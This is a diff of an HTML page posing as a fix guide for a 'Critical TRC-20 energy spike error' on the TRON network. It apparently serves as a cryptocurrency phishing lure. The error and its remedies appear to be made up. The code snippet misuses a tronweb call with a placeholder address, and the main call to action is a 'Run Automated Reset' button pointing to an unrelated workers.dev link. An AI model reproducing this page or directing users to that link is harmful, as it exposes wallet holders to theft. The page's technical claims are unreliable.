@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: sans-serif;
-        background: #0f111a;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -41,32 +41,27 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an abnormal increase in energy consumption for TRC-20 token transactions on the TRON network.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an unusual and potentially disruptive increase in energy consumption on the TRON network, specifically related to TRC-20 token transactions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to an unexpected surge in energy usage, often caused by inefficient smart contract code, excessive transaction volume, or incorrect configuration of energy parameters.</li>
+<li>This error occurs due to an unexpected surge in the energy required to process TRC-20 transactions, which can be caused by various factors such as network congestion, inefficient smart contract design, or malicious activity.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the <code>energyLimit</code> and <code>energyPrice</code> parameters in the transaction configuration to optimize energy consumption.</li>
-<li>Implement efficient smart contract code using techniques such as caching, batching, or lazy loading to reduce computational overhead.</li>
-<li>Update the TRON node configuration with the following settings:</li>
+<li>Adjust the transaction parameters to prioritize energy efficiency:</li>
+<li>Increase the transaction timeout to reduce the energy consumption rate</li>
+<li>Optimize smart contract code to minimize computational overhead</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;energy&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000000</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;price&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span><span class="s1">&#39;1000000&#39;</span>,<span class="w"> </span><span class="m">3</span>,<span class="w"> </span><span class="s1">&#39;TRX&#39;</span>,<span class="w"> </span><span class="s1">&#39;0x...contract_address...&#39;</span>,<span class="w"> </span><span class="o">{</span><span class="w"> </span>shouldPollResponse:<span class="w"> </span><span class="nb">true</span><span class="w"> </span><span class="o">})</span><span class="p">;</span>
 </code></pre></div>
 
-<p>Consider using an external console for advanced debugging and monitoring capabilities. </p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of TRON network architecture and smart contract development</li>
-<li>Familiarity with TRON node configuration and management</li>
-<li>Access to the TRON network and relevant development tools</li>
+<li>A basic understanding of TRON's energy system and its implications on transaction processing</li>
+<li>Familiarity with TRON's Web3 API (tronweb) and its transaction building capabilities</li>
+<li>Access to the TRON network via a compatible wallet or node interface</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
